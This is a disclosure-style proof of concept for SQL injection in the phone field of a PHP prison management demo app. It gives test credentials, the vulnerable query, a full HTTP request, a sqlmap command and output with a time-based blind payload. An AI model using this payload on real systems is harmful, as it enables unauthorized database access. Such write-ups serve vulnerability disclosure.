Prison Management System - SQL Injection on (/Employee/edit-profile.php) 

Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Crudentials:

```
http://url:8888/Account/login.php
releaseme@gmail.com
escobar2012
```

Affected Page:

```
/Employee/edit-profile.php
```

In this scenario, user input (txtphone) is directly  incorporated into an SQL query without any filtering or prepared  statements, making the application susceptible to SQL Injection attacks.

```
15: mysqli_query mysqli_query($conn, $sql))
14: $sql = " update users set fullname='$fullname',phone='$phone' where username='$username'"; 
11: $fullname = $_POST['txtfullname']; 
12: $phone = $_POST['txtphone']; 
32: $username = $_SESSION['admin-username'];  // topbar.php
requires:
8: if(isset($_POST['btnupdate']))
```

Proof of vulnerability:

Request:

```
POST /Employee/edit-profile.php HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 223
Origin: http://localhost:8888
Sec-GPC: 1
Connection: close
Referer: http://localhost:8888/prison/Employee/edit-profile.php
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

txtfullname=Malcom&cmdsex=Male&txtphone=08067361023&txtdob=12%2F9%2F1980&txtaddress=USA&txtqualification=Theft&cmddept=USA+Justice&cmdemployeetype=Prisoner&txtappointment=9%2F9%2F2023&txtbasic_salary=&txtgross_pay=&btnedit=
```

```
python3 sqlmap.py -r 1.txt --current-user --batch --dbms mysql
```

```
[11:49:57] [INFO] checking if the injection point on POST parameter 'txtphone' is a false positive
POST parameter 'txtphone' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 107 HTTP(s) requests:
---
Parameter: txtphone (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: txtfullname=Malcom&cmdsex=Male&txtphone=08067361023' AND (SELECT 5594 FROM (SELECT(SLEEP(5)))XCwZ) AND 'oUEH'='oUEH&txtdob=12/9/1980&txtaddress=USA&txtqualification=Theft&cmddept=USA Justice&cmdemployeetype=Prisoner&txtappointment=9/9/2023&txtbasic_salary=&txtgross_pay=&btnedit=
---
[11:50:12] [INFO] the back-end DBMS is MySQL
[11:50:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[11:50:13] [INFO] fetching current user
[11:50:13] [INFO] retrieved:
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[11:50:28] [INFO] adjusting time delay to 1 second due to good response times
root@localhost
current user: 'root@localhost'
```

